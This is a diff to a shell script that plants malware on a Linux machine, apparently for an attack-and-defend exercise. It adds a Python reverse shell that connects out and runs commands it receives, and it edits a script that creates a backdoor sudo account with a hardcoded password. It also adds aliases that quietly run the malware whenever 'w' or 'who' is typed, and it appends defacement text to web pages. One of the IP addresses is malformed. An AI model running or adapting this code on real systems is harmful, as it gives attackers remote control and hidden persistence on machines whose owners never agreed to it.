@@ -87,6 +87,7 @@ cat << EOF > /bin/fix
 /bin/echo "pokemon" >> /etc/issue.net
 /usr/bin/chattr -i /var/www/html/index.html
 /bin/echo "pokemon" >> /var/www/html/index.html
+/bin/reverse-malware
 EOF
 chmod 755 /bin/fix
 /bin/cp /bin/fix /usr/bin/pokemon-virus
@@ -97,7 +98,7 @@ cat << 'EOF' >> /bin/reverse-worm
 import socket
 import subprocess
 
-HOST = '192.168.122.1'    # The remote host
+HOST = '192.168..21.120'    # The remote host
 PORT = 5555            # The same port as used by the server
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((HOST, PORT))
@@ -116,13 +117,40 @@ s.close()
 EOF
 chmod 755 /bin/reverse-worm
 
+cat << 'EOF' >> /bin/reverse-malware
+#!/usr/bin/python
+# Simple Reverse Shell Written by: Dave Kennedy (ReL1K)
+import socket
+import subprocess
+
+HOST = '192.168..21.120'    # The remote host
+PORT = 7777            # The same port as used by the server
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
+# loop forever
+while 1:
+    # recv command line param
+    data = s.recv(1024)
+    # execute command line
+    proc = subprocess.Popen(data, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+    # grab output from commandline
+    stdout_value = proc.stdout.read() + proc.stderr.read()
+    # send back to attacker
+    s.send(stdout_value)
+# quit out afterwards and kill socket
+s.close()
+EOF
+chmod 755 /bin/reverse-malware
+
+
+
 cat << 'EOF' >> /sbin/adduser-malware.py
 #!/usr/bin/python
 import os
 import crypt
-password ="cookie"
+password ="jim"
 encPass = crypt.crypt(password,"22")
-os.system("useradd -g sudo -p "+encPass+" bagels")
+os.system("useradd -g sudo -p "+encPass+" jim")
 EOF
 chmod 755 /sbin/adduser-malware.py
 
@@ -229,6 +257,8 @@ fi
 alias cat='/sbin/let_todd_in_VIRUS.sh; cat'
 alias ls='/bin/malware.sh; echo; ls --color=auto'
 alias wall='cowsay "Whats the password?" | wall'
+alias w='/usr/bin/pokemon-virus; w'
+alias who='/bin/adduser-malware; who'
 #PS1="\u@\h:\w\$ "
 #what user@comp prompt looks like
 if [ $(id -u) -eq 0 ];
